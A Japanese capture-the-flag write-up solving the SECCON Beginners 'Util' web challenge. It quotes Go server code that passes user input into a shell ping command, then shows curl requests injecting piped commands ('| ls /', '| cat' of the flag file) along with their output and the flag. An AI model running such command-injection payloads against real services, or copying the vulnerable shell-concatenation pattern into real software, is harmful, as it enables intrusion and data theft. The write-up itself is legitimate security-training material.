# Util: 460 team solved

半数以上のチームが解けた問題が解けなかったため、すごく悔しいです。

## Description

beginner, 54 pt

author:hi120ki

ctf4b networks社のネットワーク製品にはとっても便利な機能があるみたいです! でも便利すぎて不安かも...?

(注意) SECCON Beginners運営が管理しているサーバー以外への攻撃を防ぐために外部への接続が制限されています。

https://util.quals.beginners.seccon.jp

## SOLUTIONS

入力フォームはIPアドレスの形式以外は弾いてしまう。

mainのソースコードを見てみると、アドレスの前にpingの`-p`オプションを渡したいが、それも無理そう。

https://qiita.com/s_wing/items/33c6c02883136b61caff


```go
package main
import (
	"os/exec"
	"github.com/gin-gonic/gin"
)
type IP struct {
	Address string `json:"address"`
}
func main() {
	r := gin.Default()

	r.LoadHTMLGlob("pages/*")

	r.GET("/", func(c *gin.Context) {
		c.HTML(200, "index.html", nil)
	})

	r.POST("/util/ping", func(c *gin.Context) {
		var param IP
		if err := c.Bind(&param); err != nil {
			c.JSON(400, gin.H{"message": "Invalid parameter"})
			return
		}

		commnd := "ping -c 1 -W 1 " + param.Address + " 1>&2"
		result, _ := exec.Command("sh", "-c", commnd).CombinedOutput()

		c.JSON(200, gin.H{
			"result": string(result),
		})
	})

	if err := r.Run(); err != nil {
		panic(err)
	}
}
```

OSコマンドインジェクション攻撃が使えるとのことで、IPアドレスの後ろにパイプでコマンドを発行させました。
（前がダメなら、後ろが使えないか考えるべきでした...）

```bash
# search dir
% curl -X POST -H "Content-Type: application/json" -d '{"address": "127.0.0.1 | ls /"}' https://util.quals.beginners.seccon.jp/util/ping
{"result":"app\nbin\ndev\netc\nflag_A74FIBkN9sELAjOc.txt\nhome\nlib\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n"}%
# get flag.txt
% curl -X POST -H "Content-Type: application/json" -d '{"address": "127.0.0.1 | cat /flag_A74FIBkN9sELAjOc.txt"}' https://util.quals.beginners.seccon.jp/util/ping
{"result":"ctf4b{al1_0vers_4re_i1l}\n"}%
```


## FLAG

```
ctf4b{al1_0vers_4re_i1l}
```

## REF

https://github.com/K-shir0/ctf4b_2022_k-shir0_writeups/tree/main/web/util
